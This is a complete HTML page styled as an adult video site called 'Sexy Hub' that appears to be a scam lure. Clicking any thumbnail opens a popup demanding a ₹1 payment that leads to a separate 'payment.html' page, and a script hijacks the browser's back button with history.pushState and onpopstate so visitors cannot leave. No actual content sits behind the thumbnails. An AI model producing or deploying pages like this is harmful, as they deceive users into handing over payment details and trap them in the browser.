<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Sexy Hub</title>
  <style>
    body {
      margin: 0;
      padding: 20px;
      font-family: Arial, sans-serif;
      background: #1a1a2e;
      color: #fff;
      min-height: 100vh;
    }
    .container {
      max-width: 600px;
      margin: 0 auto;
    }
    h1 {
      text-align: center;
      color: #ff1493;
    }
    .video-grid {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 15px;
      margin-top: 20px;
    }
    .video-item {
      background: #16213e;
      border-radius: 8px;
      padding: 10px;
      text-align: center;
      cursor: pointer;
    }
    .video-item img {
      width: 100%;
      border-radius: 5px;
    }
    .pay-popup {
      display: none;
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      background: rgba(0,0,0,0.8);
      z-index: 1000;
      justify-content: center;
      align-items: center;
    }
    .pay-popup-content {
      background: #232132;
      padding: 30px;
      border-radius: 10px;
      text-align: center;
    }
    .btn {
      background: #ff1493;
      color: #fff;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Sexy Hub</h1>
    <div class="video-grid" id="videoGrid"></div>
  </div>
  
  <div class="pay-popup" id="payPopup">
    <div class="pay-popup-content">
      <h2>Premium Access Required</h2>
      <p>Pay â‚¹1 to unlock all videos</p>
      <button class="btn" onclick="window.location.href='payment.html'">Pay Now</button>
      <button class="btn" onclick="document.getElementById('payPopup').style.display='none'">Close</button>
    </div>
  </div>
  
  <script>
    const videos = ['bhabhi.jpg', 'friend.jpg', 'sister.jpg', 'maid.jpg'];
    const grid = document.getElementById('videoGrid');
    
    videos.forEach(video => {
      const item = document.createElement('div');
      item.className = 'video-item';
      item.innerHTML = `<img src="${video}" alt="Video"><p>Click to view</p>`;
      item.onclick = () => {
        document.getElementById('payPopup').style.display = 'flex';
      };
      grid.appendChild(item);
    });
    
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
  </script>
</body>
</html>
